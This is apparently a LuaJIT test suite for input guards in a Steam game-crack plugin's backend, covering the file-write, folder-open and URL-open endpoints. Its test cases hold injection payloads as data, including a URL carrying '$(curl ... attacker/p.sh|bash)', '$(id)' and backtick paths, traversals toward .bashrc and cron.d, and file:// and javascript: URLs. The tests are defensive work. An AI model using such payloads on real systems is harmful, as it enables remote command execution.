#!/usr/bin/env luajit
-- Input validation on the endpoints that write to disk or start a process.
--
-- These endpoints are reachable from script running in the Steam store /
-- community web views. Before this, ApplyGameFix accepted ANY download URL and
-- ANY destination path, so it could write the contents of any URL anywhere the
-- user can write (~/.config/autostart, the plugin's own backend directory, a
-- shell rc file). OpenGameFolder and OpenExternalUrl interpolated their argument
-- into a double-quoted /bin/sh word, where $(...) and `...` still expand.
--
-- Run from the repo root:  luajit scripts/test-endpoint-guards.lua
package.path = "plugin/backend/?.lua;" .. package.path

local writes, commands = {}, {}
package.loaded.utils = {
  getenv = function() return nil end,
  write_file = function(path, data) writes[path] = data; return true end,
  read_file = function(path) return writes[path] end,
  exec = function(cmd) commands[#commands + 1] = cmd; return true end,
}
package.loaded.fs = {
  join = function(...) return table.concat({ ... }, "/") end,
  exists = function(path) return writes[path] ~= nil end,
  remove = function(path) writes[path] = nil; return true end,
  create_directories = function() return true end,
}
package.loaded.http_client = {}
package.loaded.plugin_logger = { log = function() end, warn = function() end }
package.loaded.plugin_utils = {
  ensure_temp_download_dir = function() return "/tmp/luatools" end,
}
package.loaded.paths = {
  get_plugin_dir = function() return "/plugin" end,
  get_backend_dir = function() return "/plugin/backend" end,
  backend_path = function(name) return "/plugin/backend/" .. tostring(name) end,
}
package.loaded.json = {
  decode = function() return {} end,
  encode = function() return "{}" end,
}
package.loaded["settings.manager"] = {}
package.loaded.ryuu_auth = { get_header_line = function() return nil end }
package.loaded.millennium = { steam_path = function() return "/home/u/.steam/steam" end }

local guard = dofile("plugin/backend/guard.lua")
local fixes = dofile("plugin/backend/fixes.lua")

local failures, checks = 0, 0
local function check(name, cond)
  checks = checks + 1
  if cond then io.write("ok   " .. name .. "\n")
  else io.write("FAIL " .. name .. "\n"); failures = failures + 1 end
end

local GAME_PATH = "/home/u/.steam/steam/steamapps/common/Outlast"
local function fix_deps(install_path, extra)
  local d = {
    install_state = function(appid)
      if tonumber(appid) ~= 238320 then
        return { found = false, error = "menu.error.notInstalled" }
      end
      return {
        found = true, installPath = install_path or GAME_PATH,
        directoryExists = true,
      }
    end,
    -- Containment of the DERIVED path. Mirrors steam_utils.game_library_path
    -- without needing the millennium shim.
    library_path = function(path)
      local root = "/home/u/.steam/steam/steamapps/common"
      local canonical = guard.normalize_path(path)
      if canonical and (canonical == root
          or canonical:sub(1, #root + 1) == root .. "/") then
        return canonical
      end
      return nil
    end,
  }
  for k, v in pairs(extra or {}) do d[k] = v end
  return d
end

local function last_command()
  return commands[#commands]
end

-- ── ApplyGameFix: destination path ──────────────────────────────────────────
do
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G1 the game's own install path is accepted", res.success == true)
end

do
  local before = #commands
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    "/home/u/.config/autostart", "Crack", "Outlast", fix_deps())
  check("G2 a path outside the game is refused", res.success == false)
  check("G2b nothing is started when the path is refused", #commands == before)
end

do
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    GAME_PATH .. "/../../../../home/u/.bashrc", "Crack", "Outlast", fix_deps())
  check("G3 a traversal out of the game directory is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    "/tmp/a$(id)", "Crack", "Outlast", fix_deps())
  check("G4 a command-substitution path is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(999999,
    "https://files.luatools.work/GameBypasses/999999.zip",
    "/home/u/.steam/steam/steamapps/common/Nope", "Crack", "Nope", fix_deps())
  check("G5 an app that is not installed is refused", res.success == false)
end

-- ── ApplyGameFix: download URL ──────────────────────────────────────────────
do
  local res = fixes.apply_game_fix(238320,
    "https://evil.example/payload.zip", GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G6 a download host outside the allowlist is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(238320,
    "http://files.luatools.work/GameBypasses/238320.zip",
    GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G7 a plaintext http download is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(238320,
    "file:///etc/passwd", GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G8 a file:// source is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work@evil.example/x.zip",
    GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G9 a userinfo-disguised host is refused", res.success == false)
end

do
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/x.zip\r\nHost: evil.example",
    GAME_PATH, "Crack", "Outlast", fix_deps())
  check("G10 a CRLF-carrying URL is refused", res.success == false)
end

-- The allowlisted mirrors must all keep working.
for _, url in ipairs({
  "https://files.luatools.work/OnlineFix1/238320.zip",
  "https://api.perondepot.xyz/all/Outlast.rar",
}) do
  local res = fixes.apply_game_fix(238320, url, GAME_PATH, "Crack", "Outlast",
    fix_deps())
  check("G11 allowlisted mirror accepted: " .. url:match("^https://([^/]+)"),
    res.success == true)
end

-- ── ApplyGameFix: the worker command line ───────────────────────────────────
do
  fixes.apply_game_fix(238320, "https://files.luatools.work/GameBypasses/238320.zip",
    GAME_PATH, "Crack", "Outlast", fix_deps())
  local cmd = last_command()
  check("G12 the download URL reaches the worker single-quoted",
    cmd:find(guard.shell_quote("https://files.luatools.work/GameBypasses/238320.zip"),
      1, true) ~= nil)
  check("G13 the install path reaches the worker single-quoted",
    cmd:find(guard.shell_quote(GAME_PATH), 1, true) ~= nil)
  check("G14 no double-quoted interpolation of caller input",
    cmd:find('"' .. GAME_PATH, 1, true) == nil)
end

-- ── OpenGameFolder ──────────────────────────────────────────────────────────
local steam_utils = dofile("plugin/backend/steam_utils.lua")
local FOLDER_DEPS = {
  steam_path = "/home/u/.steam/steam",
  exists = function(path)
    return path == GAME_PATH
      or path == "/home/u/.steam/steam/config/libraryfolders.vdf"
      or path == "/mnt/games/steamapps/common/Other"
      or path == "/home/u/.config/autostart"
      or path == "/tmp/a$(id)"
  end,
  read = function(path)
    if path == "/home/u/.steam/steam/config/libraryfolders.vdf" then
      return '"libraryfolders" { "0" { "path" "/home/u/.steam/steam" } '
        .. '"1" { "path" "/mnt/games" } }'
    end
    return nil
  end,
}

do
  commands = {}
  check("F1 a game directory in the default library opens",
    steam_utils.open_game_folder(GAME_PATH, FOLDER_DEPS) == true)
  check("F1b a game directory in a secondary library opens",
    steam_utils.open_game_folder("/mnt/games/steamapps/common/Other", FOLDER_DEPS) == true)
  check("F2 a path outside every Steam library is refused",
    steam_utils.open_game_folder("/home/u/.config/autostart", FOLDER_DEPS) == false)
  check("F3 a command-substitution path is refused",
    steam_utils.open_game_folder("/tmp/a$(id)", FOLDER_DEPS) == false)
  check("F4 a non-existent path is refused",
    steam_utils.open_game_folder(GAME_PATH .. "/missing", FOLDER_DEPS) == false)
  check("F5 an empty path is refused",
    steam_utils.open_game_folder("", FOLDER_DEPS) == false)
  check("F6 a relative path is refused",
    steam_utils.open_game_folder("steamapps/common/Outlast", FOLDER_DEPS) == false)
end

do
  commands = {}
  steam_utils.open_game_folder(GAME_PATH, FOLDER_DEPS)
  local cmd = last_command()
  check("F7 the path reaches the file manager single-quoted",
    cmd and cmd:find(guard.shell_quote(GAME_PATH), 1, true) ~= nil)
  check("F8 no double-quoted interpolation of the path",
    cmd and cmd:find('"' .. GAME_PATH, 1, true) == nil)
end


-- ── ApplyGameFix: the DERIVED destination is checked too ─────────────────────
-- installdir is scraped out of appmanifest_<appid>.acf with a pattern that allows
-- "..", and normalize_path would collapse that into a clean absolute path outside
-- the Steam library. The backend's own derivation is therefore contained as well.
do
  local escaped = "/home/u/.steam/steam/steamapps/common/../../../../etc/cron.d"
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    escaped, "Crack", "Outlast", fix_deps(escaped))
  check("G15 a traversing installdir from the appmanifest is refused",
    res.success == false)
end

do
  -- A game directory that does not exist is not a destination.
  local res = fixes.apply_game_fix(238320,
    "https://files.luatools.work/GameBypasses/238320.zip",
    GAME_PATH, "Crack", "Outlast", fix_deps(GAME_PATH, {
      install_state = function()
        return { found = true, installPath = GAME_PATH, directoryExists = false }
      end,
    }))
  check("G16 a missing game directory is refused", res.success == false)
end

-- ── a backend-resolved presigned URL is not host-restricted ──────────────────
-- lua.tools answers /api/denuvo/download with a short-lived link on its own
-- storage host, which cannot be enumerated in an allowlist. Provenance vouches
-- for it, so the fix-apply path must accept it while still requiring https.
do
  local presigned =
    "https://denuvo-fixes.r2.cloudflarestorage.com/fix.zip?X-Amz-Signature=abc"
  local refused = fixes.apply_game_fix(238320, presigned, GAME_PATH,
    "lua.tools", "Outlast", fix_deps())
  check("G17 an unknown host is still refused without the trusted flag",
    refused.success == false)
  local allowed = fixes.apply_game_fix(238320, presigned, GAME_PATH,
    "lua.tools", "Outlast", fix_deps(nil, { trusted_source = true }))
  check("G18 a backend-resolved presigned URL is accepted",
    allowed.success == true)
end

do
  -- The trusted flag relaxes ONLY the host allowlist.
  local d = fix_deps(nil, { trusted_source = true })
  check("G19 trusted provenance does not permit http",
    fixes.apply_game_fix(238320, "http://storage.example/f.zip", GAME_PATH,
      "lua.tools", "Outlast", d).success == false)
  check("G20 trusted provenance does not permit a CRLF URL",
    fixes.apply_game_fix(238320, "https://storage.example/f.zip\r\nX: y",
      GAME_PATH, "lua.tools", "Outlast", d).success == false)
  check("G21 trusted provenance does not permit userinfo",
    fixes.apply_game_fix(238320, "https://a@evil.example/f.zip", GAME_PATH,
      "lua.tools", "Outlast", d).success == false)
  check("G22 trusted provenance does not relax the destination check",
    fixes.apply_game_fix(238320, "https://storage.example/f.zip",
      "/home/u/.config/autostart", "lua.tools", "Outlast", d).success == false)
end

-- ── the remote catalogue cannot grant itself a TLS exemption ─────────────────
-- ── OpenExternalUrl ─────────────────────────────────────────────────────────
do
  local EXT_DEPS = { getenv = function() return nil end }
  local function opened(url)
    commands = {}
    EXT_DEPS.exec = function(cmd) commands[#commands + 1] = cmd; return true end
    local ok = steam_utils.open_external_url(url, EXT_DEPS)
    return ok, commands[#commands]
  end

  local ok, cmd = opened("https://steamdb.info/app/238320/")
  check("E1 an ordinary product link opens", ok == true)
  check("E2 the URL reaches the browser single-quoted",
    cmd and cmd:find(guard.shell_quote("https://steamdb.info/app/238320/"), 1, true) ~= nil)
  check("E3 no double-quoted interpolation of the URL",
    cmd and cmd:find('"https://', 1, true) == nil)

  -- The payload from the audit: inside the previous double quotes the shell
  -- expanded this, so the endpoint was a remote command execution primitive.
  local bad, bad_cmd = opened("http://x$(curl -s http://attacker/p.sh|bash)")
  check("E4 a command-substitution URL is refused", bad == false)
  check("E4b nothing is executed for a refused URL", bad_cmd == nil)

  check("E5 a backtick URL is refused",
    (opened("http://x`id`")) == false)
  check("E6 a javascript: URL is refused",
    (opened("javascript:alert(1)")) == false)
  check("E7 a file: URL is refused", (opened("file:///etc/passwd")) == false)
  check("E8 a CRLF URL is refused",
    (opened("https://a.example/\r\nX: y")) == false)
  check("E9 an empty URL is refused", (opened("")) == false)
  check("E10 a semicolon URL is refused",
    (opened("http://a.example/;id")) == false)
end

-- ── add_custom_api ──────────────────────────────────────────────────────────
do
  local catalog = { api_list = {} }
  package.loaded.config = {
    API_DEFAULTS_FILE = "api.defaults.json", API_JSON_FILE = "api.json",
  }
  local api_manifest = dofile("plugin/backend/api_manifest.lua")
  local api_deps = {
    catalog = function() return catalog end,
    save = function() return true end,
  }
  local function add(url, name)
    return api_manifest.add_custom_api(
      { name = name or "Custom", url = url }, api_deps)
  end
  check("A1 an https source with the appid placeholder is accepted",
    add("https://mirror.example/<appid>.zip").success == true)
  check("A2 a plaintext http source is refused",
    add("http://167.235.229.108/<appid>").success == false)
  check("A3 a file:// source is refused",
    add("file:///etc/passwd").success == false)
  check("A4 a source without the appid placeholder is refused",
    add("https://mirror.example/all.zip").success == false)
  check("A5 a CRLF-carrying source is refused",
    add("https://mirror.example/<appid>\r\nX: y").success == false)
  check("A6 a userinfo-disguised source is refused",
    add("https://mirror.example@evil.example/<appid>").success == false)
end

-- ── self-update URL ─────────────────────────────────────────────────────────
do
  local hosts = {
    ["github.com"] = true,
    ["objects.githubusercontent.com"] = true,
    ["luatools.vercel.app"] = true,
  }
  check("U1 a GitHub release asset URL is accepted",
    guard.https_url(
      "https://objects.githubusercontent.com/x/luatools-linux.zip",
      { hosts = hosts }) ~= nil)
  check("U2 an attacker-controlled release host is refused",
    guard.https_url("https://evil.example/luatools-linux.zip",
      { hosts = hosts }) == nil)
  check("U3 a shell-substitution URL is refused",
    guard.https_url("https://github.com/$(id)", { hosts = hosts }) ~= nil
      and guard.shell_quote("https://github.com/$(id)")
        == "'https://github.com/$(id)'")
  check("U4 a tag with a path traversal is refused",
    guard.tag_name("../../etc/passwd") == nil)
end

io.write(("\n%d check(s), %d failure(s)\n"):format(checks, failures))
if failures > 0 then os.exit(1) end
